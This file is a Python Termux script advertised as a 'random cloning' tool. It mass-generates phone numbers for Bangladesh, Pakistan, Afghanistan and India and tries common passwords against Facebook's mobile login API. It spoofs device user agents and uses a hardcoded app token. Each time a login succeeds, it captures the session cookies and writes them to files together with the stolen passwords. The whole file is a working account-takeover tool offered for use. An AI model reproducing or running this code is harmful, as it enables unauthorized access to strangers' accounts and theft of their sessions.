#Sc Gift By Ghost
#Github : https://github.com/Ghost3987
#Group : Termux Free Command World 2024
#──────────[ IMPORT MODEULS ]──────────#
import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
import marshal,base64
os.system("clear")
print('\n\033[1;90m(\033[1;92m+\033[1;90m)\033[1;33m WELLCOME TO GHOST KING TOOL')
time.sleep(3)
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    os.system('pip install requests bs4 futures==2 > /dev/null')
except:pass

#──────────[ USER AGENT ]──────────#
def ghostff():
    fb_av = f"{random.randint(50, 60)}.0.0.{random.randint(3700, 4000)}"
    fb_bv = str(random.randint(66205985, 66205990))
    fb_cr = random.choice(["Ufone", "Telenor", "Verizon", "AT&T"])
    fb_mf = random.choice(["INFINIX MOBILITY LIMITED", "Samsung", "Xiaomi", "Google"])
    fb_bd = random.choice(["Infinix", "Samsung", "Xiaomi", "Google"])
    fb_dv = random.choice(["Infinix X695", "Samsung Galaxy S21", "Xiaomi Mi 11", "Google Pixel 5"])
    fb_sv = str(random.randint(10, 12))
    density = random.choice([2.0, 2.5, 3.0])
    width = random.choice([720, 1080])
    height = random.choice([1440, 2400, 2340])
    user_agent = f"[FBAN/FB4A; FBAV/{fb_av}; FBBV/{fb_bv}; FBAN/Orca-Android; FBAV/{fb_av}; FBPN/com.facebook.orca; FBBV/{fb_bv}; FBLC/en_US; FBCA/arm64-v8a; FBCR/{fb_cr}; FBMF/{fb_mf}; FBBD/{fb_bd}; FBDV/{fb_dv}; FBSV/{fb_sv}; FBDM={{density={density}, width={width}, height={height}}};]"    
    return user_agent

#──────────[ LOOP ]──────────#
loop=0
twf=[]
oks=[]
cps=[]
ok=[]
cp=[]
pcp=[]
id=[]
tokenku=[]
#──────────[ COLOR ]──────────#
W = '\033[97;1m' 
B = '\033[96;1m'
P = '\033[95;1m' 
R = '\033[91;1m' 
G = '\033[92;1m'
coko=f'\033[1;42m\033[1;37mCOOKIE\033[;0m\033[1;97m'
#──────────[ FOLDER ]──────────#
try:
	os.makedirs('/sdcard/GHOST')
except:
		pass
sys.stdout.write('\x1b]2;GHOST-KING\x07')
#──────────[ LOGO-BOX ]──────────#
logo = (f"""
\033[1;93m┏─────────────────────────┳─────────────────────┓
\033[1;93m│  \033[1;37m┏┓┓┏┏┓┏┓┏┳┓  \033[1;93m┓┏┓┳┳┓┏┓\033[1;91m  │ \x1b[38;5;205mOWNER \033[1;37m : \033[1;92mGHOST KING\033[1;93m │
\033[1;93m│  \033[1;37m┃┓┣┫┃┃┗┓ ┃ \033[1;92m━ \033[1;93m┃┫ ┃┃┃┃┓\033[1;93m  │ \033[1;92mSTATUS \033[1;37m: \033[1;96mPAID\033[1;93m       │
\033[1;93m│  \033[1;37m┗┛┛┗┗┛┗┛ ┻   \033[1;93m┛┗┛┻┛┗┗┛\033[1;91m  │ \033[1;95mGITHUB \033[1;37m: \033[1;92mGhost3987\033[1;93m  │
\033[1;93m│  \033[1;32m      VERSION \033[1;37m: \033[1;92m1\033[1;37m.\033[1;92m2\033[1;37m.\033[1;92m3  \033[1;93m│  <\033[1;91m\033[1;41m\033[1;36mRANDOM  CLONING\033[;0m\033[1;91m\033[1;93m>  │
\033[1;93m┗─────────────────────────┻─────────────────────┛
\033[1;93m┏───────────────────────────────────────────────┓
\033[1;93m│  \033[1;32m FB GROUP \033[1;37m:\033[1;35m Termux Free Command World 2024 \033[1;93m  │
\033[1;93m┗───────────────────────────────────────────────┛\033[1;31m""")
#──────────[ LINE ]──────────#
def line():
	print(f'\033[1;93m─────────────────────────────────────────────────')
#──────────[ XLEAR ]──────────#
def clear():
	os.system(f'clear')
	print(logo)
#──────────[ MAIN-MENU ]──────────#
def menu():
			clear()
			line()
			print(f"\033[1;30m[\033[1;37m1\033[1;30m] {W}RANDOM CLONING")
			print(f"\033[1;30m[\033[1;37m0\033[1;30m] {R}EXIT ")
			line()
			xd=input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m SELECT\033[1;37m :\033[1;33m ')
			if xd in ['1','01']:
				Tx_World()
			elif xd in ['0','00']:
				exit(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m Thanks For Use ')
			else:
				exit(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m Option not found in menu...')
#──────────[ RADNOM-CRACK ]──────────#
def Tx_World():
    clear()
    print(f'\033[1;30m[\033[1;37m1\033[1;30m]\033[1;92m BANGLADESH CLONING\n\033[1;30m[\033[1;37m2\033[1;30m]\033[1;92m PAKISTAN CLONING\n\033[1;30m[\033[1;37m3\033[1;30m]\033[1;92m AFGHANISTAN CLONING\n\033[1;30m[\033[1;37m4\033[1;30m]\033[1;92m INDIA CLONING\n\033[1;30m[\033[1;37m0\033[1;30m]\033[1;92m BACK MENU')
    line()
    option=input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m SELECT\033[1;37m :\033[1;33m ')
    if option in ['1','01']:
        bd()
    if option in ['2','02']:
        pak()
    if option in ['3','03']:
        afg()
    if option in ['4','04']:
        ind()
    if option in ['0','00']:
    	menu()
    else:
    	line()
    print(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m SELECTED WRONG OPTION')
    time.sleep(2)
    Tx_World()
#──────────[ BANGLADESH ]──────────#
def bd():
                user=[]
                clear()
                print(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m EXAMPLE  \033[1;37m: \033[1;33m017 | 016 | 018 | 019')
                code = input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m PUT CODE \033[1;37m:\033[1;33m ')
                clear()
                try:
                        limit = int(input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m EXAMPLE : 2000 | 3000 | 5000 | 10000\n\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m PUT LIMIT\033[1;37m :\033[1;33m '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as txfire:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'\033[1;30m[\033[1;32m+\033[1;30m] {W}TOTAL\033[1;33m UID\033[1;37m : \033[1;32m'+tl)
                        print(f'\033[1;30m[\033[1;32m=\033[1;30m] \033[1;36mSIM CODE \033[1;37m : \033[1;32m'+code)
                        print(f'\033[1;30m[\033[1;32m+\033[1;30m] \033[1;32mTURN \033[1;30m[\033[1;32mON\033[1;30m/\033[1;31mOFF\033[1;30m] \033[1;32mAIRPLAN MOD IN EVERY \033[1;33m3 \033[1;32mMIN')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','Jannat','Bangladesh','bangladesh']
                                txfire.submit(rd,ids,passlist)
                line()
                print(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m THE PROCESS HAS COMPLETED')
                print(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m PRESS ENTER TO BACK ')
                menu()
#──────────[ PAKISTAN ]──────────#
def pak():
                user=[]
                clear()
                print(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m EXAMPLE  \033[1;37m: \033[1;33m0300 | 0315 | 0333 | 0345')
                code = input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m PUT CODE \033[1;37m:\033[1;33m ')
                clear()
                try:
                        limit = int(input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m EXAMPLE : 2000 | 3000 | 5000 | 10000\n\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m PUT LIMIT\033[1;37m :\033[1;33m '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as txfire:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'\033[1;30m[\033[1;32m+\033[1;30m] {W}TOTAL\033[1;33m UID\033[1;37m : \033[1;32m'+tl)
                        print(f'\033[1;30m[\033[1;32m=\033[1;30m] \033[1;36mSIM CODE \033[1;37m : \033[1;32m'+code)
                        print(f'\033[1;30m[\033[1;32m+\033[1;30m] \033[1;32mTURN \033[1;30m[\033[1;32mON\033[1;30m/\033[1;31mOFF\033[1;30m] \033[1;32mAIRPLAN MOD IN EVERY \033[1;33m3 \033[1;32mMIN')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist=[psx,ids,'khan khan','khan1122','khan786','khankhan','malik123','kingkhan','baloch123','pak123','khan123','janjan','ali123','pakistan','pakistan786']
                                txfire.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m THE PROCESS HAS COMPLETED')
                print(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m PRESS ENTER TO BACK ')
                menu()
#──────────[ AFGHANISTAN ]──────────#
def afg():
                user=[]
                clear()
                print(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m EXAMPLE  \033[1;37m: \033[1;33m9377 | 9379 | 9374')
                code = input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m PUT CODE \033[1;37m:\033[1;33m ')
                clear()
                try:
                        limit = int(input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m EXAMPLE : 2000 | 3000 | 5000 | 10000\n\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m PUT LIMIT\033[1;37m :\033[1;33m '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as txfire:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'\033[1;30m[\033[1;32m+\033[1;30m] {W}TOTAL\033[1;33m UID\033[1;37m : \033[1;32m'+tl)
                        print(f'\033[1;30m[\033[1;32m=\033[1;30m] \033[1;36mSIM CODE \033[1;37m : \033[1;32m'+code)
                        print(f'\033[1;30m[\033[1;32m+\033[1;30m] \033[1;32mTURN \033[1;30m[\033[1;32mON\033[1;30m/\033[1;31mOFF\033[1;30m] \033[1;32mAIRPLAN MOD IN EVERY \033[1;33m3 \033[1;32mMIN')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶Ã›Â·Ã›Â¸Ã›Â¹','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                txfire.submit(rd,ids,passlist)
                line()
                print(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m THE PROCESS HAS COMPLETED')
                print(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m PRESS ENTER TO BACK ')
                menu()
#──────────[ INDIA ]──────────#
def ind():
                user=[]
                clear()
                print(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m EXAMPLE  \033[1;37m: \033[1;33m91637 | 91704 | 91793')
                code = input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m PUT CODE \033[1;37m:\033[1;33m ')
                clear()
                try:
                        limit = int(input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m EXAMPLE : 2000 | 3000 | 5000 | 10000\n\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m PUT LIMIT\033[1;37m :\033[1;33m '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as ourtx:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'\033[1;30m[\033[1;32m+\033[1;30m] {W}TOTAL\033[1;33m UID\033[1;37m : \033[1;32m'+tl)
                        print(f'\033[1;30m[\033[1;32m=\033[1;30m] \033[1;36mSIM CODE \033[1;37m : \033[1;32m'+code)
                        print(f'\033[1;30m[\033[1;32m+\033[1;30m] \033[1;32mTURN \033[1;30m[\033[1;32mON\033[1;30m/\033[1;31mOFF\033[1;30m] \033[1;32mAIRPLAN MOD IN EVERY \033[1;33m3 \033[1;32mMIN')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'57273200','hindustan','57575751']
                                ourtx.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m THE PROCESS HAS COMPLETED')
                print(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m PRESS ENTER TO BACK ')
                menu()
#──────────[ RNM-METHOD ]──────────#                
def rd(uid,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write(f'\r\r\033[1;30m[\033[1;32mGHOST\033[1;30m]\033[1;37m-\033[1;30m[\033[1;33m%s\033[1;30m]\033[1;37m-\033[1;30m[\033[1;32mOK\033[1;37m:\033[1;32m%s\033[1;30m]\033[1;37m-\033[1;30m[\033[1;31mCP\033[1;37m:\033[1;31m%s\033[1;30m]\033[1;34m'%(loop,len(ok),len(cp)));sys.stdout.flush()
		for pas in passlist:
			data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'family_device_id': str(uuid.uuid4()), 'secure_family_device_id': str(uuid.uuid4()), 'cpl': 'true', 'try_num': '1', 'email': uid, 'password': pas, 'method': 'auth.login', 'generate_session_cookies': '1', 'sim_serials': "['80973453345210784798']", 'openid_flow': 'android_login', 'openid_provider': 'google', 'openid_emails': "['01710940017']", 'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']", 'error_detail_type': 'button_with_disabled', 'source': 'account_recovery', 'locale': 'en_GB', 'client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
			head = {'Host': 'graph.facebook.com', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Priority': 'u=3, i', 'X-Fb-Sim-Hni': '45204', 'X-Fb-Net-Hni': '45201', 'X-Fb-Connection-Quality': 'GOOD', 'Zero-Rated': '0', 'User-Agent': ghostff(), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-Fb-Connection-Bandwidth': '24807555', 'X-Fb-Connection-Type': 'MOBILE.LTE', 'X-Fb-Device-Group': '5120', 'X-Tigon-Is-Retry': 'False', 'X-Fb-Friendly-Name': 'authenticate', 'X-Fb-Request-Analytics-Tags': 'unknown', 'X-Fb-Http-Engine': 'Liger', 'X-Fb-Client-Ip': 'True', 'X-Fb-Server-Cluster': 'True', 'Content-Length': '847'}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print(f'\r\033[1;32m[GHOST-OK] '+uid+' | '+pas+'\033[1;37m')
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				GHOSTMEW= base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={GHOSTMEW};{ckkk}"
				print(f'\r{coko} '+cookie)
				open('/sdcard/GHOST/GHOST-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
				ok.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\033[1;30m[GHOST-CP] '+uid+' | '+pas+'\033[1;37m')
				open('/sdcard/GHOST/GHOST-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
				cp.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleeprint(20)
	except Exception as e:
		pass

#──────────[ end ]──────────#
menu()